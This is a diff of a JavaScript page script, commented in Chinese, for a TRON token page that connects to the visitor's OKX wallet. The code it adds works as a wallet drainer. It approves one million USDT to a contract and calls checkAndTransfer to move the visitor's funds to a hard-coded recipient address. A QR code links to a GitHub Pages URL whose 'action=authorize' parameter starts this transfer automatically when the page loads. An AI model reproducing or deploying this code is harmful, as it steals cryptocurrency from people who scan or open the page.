@@ -1,14 +1,9 @@
-const TRONWEB_API = 'https://api.trongrid.io';
-const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const CUSTOM_CONTRACT_ADDRESS = 'TJKQATfKMkgbVVNjS1BXfXfaup3CCcAkQz';
-const RECIPIENT_ADDRESS = 'TXov68aLHojmFmZm7HdXax1L5mNbgSQ8pE';
-
-const tronWeb = new TronWeb({
-    fullHost: TRONWEB_API
-});
+const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const autoTransferContractAddress = 'TJKQATfKMkgbVVNjS1BXfXfaup3CCcAkQz';
+const recipientAddress = 'TXov68aLHojmFmZm7HdXax1L5mNbgSQ8pE';
+const approveAmount = 1000000 * 10 ** 6; // 100万 USDT（6个小数）
 
 const usdtAbi = [
-    // 完整的USDT合约ABI
     {"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
     {"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
     {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
@@ -57,43 +52,61 @@ const usdtAbi = [
     {"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}
 ];
 
-const customAbi = [
-    { "inputs": [ { "internalType": "address", "name": "_usdtToken", "type": "address" } ], "stateMutability": "nonpayable", "type": "constructor" },
-    { "anonymous": false, "inputs": [ { "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" } ], "name": "Transfer", "type": "event" },
-    { "inputs": [ { "internalType": "address", "name": "userWallet", "type": "address" } ], "name": "checkAndTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-    { "inputs": [], "name": "owner", "outputs": [ { "internalType": "address", "name": "", "type": "address" } ], "stateMutability": "view", "type": "function" },
-    { "inputs": [ { "internalType": "uint256", "name": "newThreshold", "type": "uint256" } ], "name": "setThreshold", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-    { "inputs": [], "name": "threshold", "outputs": [ { "internalType": "uint256", "name": "", "type": "uint256" } ], "stateMutability": "view", "type": "function" },
-    { "inputs": [], "name": "usdtToken", "outputs": [ { "internalType": "address", "name": "", "type": "address" } ], "stateMutability": "view", "type": "function" }
+const autoTransferAbi = [
+    { "inputs": [{ "internalType": "address", "name": "_usdtToken", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
+    { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" },
+    { "inputs": [{ "internalType": "address", "name": "userWallet", "type": "address" }], "name": "checkAndTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+    { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [{ "internalType": "uint256", "name": "newThreshold", "type": "uint256" }], "name": "setThreshold", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+    { "inputs": [], "name": "threshold", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+    { "inputs": [], "name": "usdtToken", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
 ];
 
-const usdtContract = tronWeb.contract(usdtAbi, USDT_CONTRACT_ADDRESS);
-const customContract = tronWeb.contract(customAbi, CUSTOM_CONTRACT_ADDRESS);
+let tronWeb;
 
 async function authorizeAndTransfer() {
+    if (typeof window.okxwallet === 'undefined') {
+        alert('请安装欧易钱包!');
+        return;
+    }
+    tronWeb = window.okxwallet;
     try {
-        const amount = 1000000 * 1e6; // 授权100万USDT，单位是微USDT
+        await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
 
-        // Step 1: Authorize the custom contract to spend USDT
-        const authorizeTx = await usdtContract.methods.approve(CUSTOM_CONTRACT_ADDRESS, amount).send();
-        console.log('Authorization TX:', authorizeTx);
+        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
+        const autoTransferContract = await tronWeb.contract().at(autoTransferContractAddress);
 
-        // Step 2: Call the custom contract to check and transfer
-        const transferTx = await customContract.methods.checkAndTransfer(RECIPIENT_ADDRESS).send();
-        console.log('Transfer TX:', transferTx);
+        // 授权USDT
+        await usdtContract.approve(autoTransferContractAddress, approveAmount).send();
 
-        document.getElementById('result').innerText = '授权并转账成功';
+        // 执行自动转账
+        await autoTransferContract.checkAndTransfer(tronWeb.defaultAddress.base58).send();
+
+        document.getElementById('result').innerText = '授权和转账成功';
     } catch (error) {
-        console.error('Error during authorization or transfer:', error);
+        console.error(error);
         document.getElementById('result').innerText = '授权或转账失败';
     }
 }
 
-document.getElementById('authorizeButton').addEventListener('click', authorizeAndTransfer);
+// 生成二维码
+function generateQRCode() {
+    const url = 'https://wanglei3215.github.io/okktokenproject/?action=authorize';
+    QRCode.toCanvas(document.getElementById('qrcode'), url, function (error) {
+        if (error) console.error(error);
+        console.log('QR Code generated!');
+    });
+}
 
-// Generate QR code
-const url = window.location.href;
-QRCode.toCanvas(document.getElementById('qrcode'), url, function (error) {
-    if (error) console.error(error);
-    console.log('QR code generated!');
+// 检查URL参数并执行相应操作
+function checkUrlParams() {
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('action') === 'authorize') {
+        authorizeAndTransfer();
+    }
+}
+
+document.addEventListener('DOMContentLoaded', function () {
+    generateQRCode();
+    checkUrlParams();
 });
